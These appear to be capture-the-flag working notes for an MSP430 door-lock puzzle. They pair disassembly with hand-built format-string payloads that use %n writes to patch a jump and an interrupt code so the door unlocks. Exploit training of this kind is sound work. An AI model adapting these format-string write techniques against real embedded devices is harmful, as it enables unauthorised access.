4438 <main>
4438:  0441           mov	sp, r4
443a:  2453           incd	r4
443c:  3150 0cfe      add	#0xfe0c, sp
4440:  3012 da44      push	#0x44da "Enter your username below to authenticate."
4444:  b012 c645      call	#0x45c6 <printf>
4448:  b140 0645 0000 mov	#0x4506 ">> ", 0x0(sp)
444e:  b012 c645      call	#0x45c6 <printf>
4452:  2153           incd	sp
4454:  3e40 f401      mov	#0x1f4, r14
4458:  3f40 0024      mov	#0x2400, r15
445c:  b012 8a45      call	#0x458a <getsn> // Read username to 0x2400 (Len 0x1f4 - 500)
4460:  3e40 0024      mov	#0x2400, r14
4464:  0f44           mov	r4, r15
4466:  3f50 0afe      add	#0xfe0a, r15
446a:  b012 dc46      call	#0x46dc <strcpy> // Copy to stack
446e:  3f40 0afe      mov	#0xfe0a, r15
4472:  0f54           add	r4, r15
4474:  0f12           push	r15
4476:  b012 c645      call	#0x45c6 <printf> // Print username
447a:  2153           incd	sp
447c:  3f40 0a00      mov	#0xa '\n', r15
4480:  b012 4e45      call	#0x454e <putchar>
4484:  0f44           mov	r4, r15
4486:  3f50 0afe      add	#0xfe0a, r15
448a:  b012 b044      call	#0x44b0 <conditional_unlock_door>
448e:  0f93           tst	r15
4490:  0324           jz	$+0x8 <main+0x60>
4492:  3012 0a45      push	#0x450a
4496:  023c           jmp	$+0x6 <main+0x64>
4498:  3012 1a45      push	#0x451a
449c:  b012 c645      call	#0x45c6 <printf>
44a0:  0f43           clr	r15
44a2:  3150 f601      add	#0x1f6, sp

ret sp address: 420a

%x   %x   %x  %x   %x   %x   %x   %x   %x   %x   %x   %x   %x   %x
7825 7825 7825 7825 7825 7825 7825 7825 7825 7825 7825 7825 7825 7825

SP	 A*34 + len(0a42)                                                                       %n
0a42 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 256e
STR  SP    %s
da44 0a42 2573 256e
Real Len=0x2f = 47
da44 da44 0a42 2573 2573 256e
Real Len=0x5c = 92
diff -> 45
a_n = 2 + 45*n
hex(2 + 45*204 + 34) = 0x2400
.
80ff 0a42 2573 256e
Real Len=0x82 = 130
80ff 80ff 0a42 2573 2573 256e
Real Len=0x102 = 258
diff -> 128
a_n = 2 + 128*n
hex(2 + 128*71 + 2 + 45*2 + 34) = 0x2400
.

'80ff ' * 72 + '0a42 ' + '2573 ' * 72 + '256e' = 0x2402
80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 0a42 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 256e
len: 292
# We will ignore the spam data and will use at prefix for the shellcode
# Add shellcode: 3012 7f00 b012 3645
80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 0a42 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 256e 3012 7f00 b012 3645
# + Insert SP and %s %n
80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 0a42 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 256e

80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 da44 0a42 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 4141 256e
Enter your username below to authenticate. -> Len=0x2b (43)
0x44d8 - 0x447a = 0x5e

# TODO: write to code section, jmp with offset of 0x5e for ret "2e3c           jmp	$+0x5e"
hex(2 + 128*120 + 44)
ccff -> the same string but only the last 44 bytes
'80ff ' * 120 + 'ccff ' + '0a42 '+ '2573 ' * 121 + '256e'
80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff ccff 0a42 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 256e
Result of change to 363c
.
'80ff ' * 120 + 'd4ff ' + '0a42 '+ '2573 ' * 121 + '256e'
80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff d4ff 0a42 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 256e
Result of change to 2e3c
# Change overwrite to code: 
'80ff ' * 120 + 'd4ff ' + '7a44 '+ '2573 ' * 121 + '256e'
80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff d4ff 7a44 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 256e
# WORKINGGGG - Jumping to ret, The problem is that I don't have enough buffer to write the shellcode + the sp, I should find a better widget to jump to

# I can overwrite the 7e to 7F and jmp to 44c6 in order to unlock
44c6:  3012 7e00      push	#0x7e
44ca:  b012 3645      call	#0x4536 <INT>
Offset: 0x44c6 - 0x447a = 0x4c

253c           jmp	$+0x4c

'83ff ' + 'c844 ' + '2573 ' + '256e'
83ff c844 2573 256e

Before: 44c0: 0e54 0e12 0f12 3012 7e00 b012 3645 5f44   .T....0.~...6E_D
After:  44c0: 0e54 0e12 0f12 3012 7f00 b012 3645 5f44   .T....0....6E_D

Now add the jump:

STR        WRITETO   %s        %n
'83ff ' + 'c844 ' + '2573 ' + '256e ' \
+ '80ff ' * 119 + 'e4ff ' + '7a44 '+ '2578 ' * 2 + '2573 ' * 120 + '256e'
   STR             SHRT_S     WRITETO  %x           %s              %n

83ff c844 2573 256e 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff 80ff e4ff 7a44 2578 2578 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 2573 256e
